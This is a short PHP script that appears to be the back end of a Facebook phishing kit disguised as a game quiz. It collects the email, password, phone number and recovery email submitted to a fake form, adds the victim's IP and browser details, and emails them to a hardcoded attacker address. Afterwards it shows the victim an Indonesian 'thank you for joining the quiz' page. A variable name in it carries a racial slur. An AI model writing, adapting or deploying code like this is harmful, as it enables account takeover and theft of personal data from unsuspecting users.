<?php
error_reporting(0);
include('cilepeung.php');

$email    = $_POST['email'];
$pass = $_POST['pass'];
$th = $_POST['townhall'];
$xp = $_POST['xp'];
$pn = $_POST['phone'];
$recover = $_POST['emailr'];

$message   = "

>>>>> SETORAN FACEBOOK <<<<<
                               
Email : ".$email."           
Password :  ".$pass."       
  
>>>>> DOSA DITANGGUNG SITU <<<<<


+++++ INFO +++++

IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

+++++ End PC Info +++++


";

include 'email.php';
$subject = "Akun ".$email." (".$alamat.")";
$headers = "From: SETORAN AKUN FACEBOOK <debidhistira@gmail.com>";
mail($emailku, $subject, $message, $headers);

echo "<script LANGUAGE=\"JavaScript\">
<!--
// -->
</script>";
?>
<?php
$random = rand(1000,5000);
?>
<title> Thank You ! </title>
<center> <h2> Selamat Anda Telah Mengikuti Quiz </h2><br>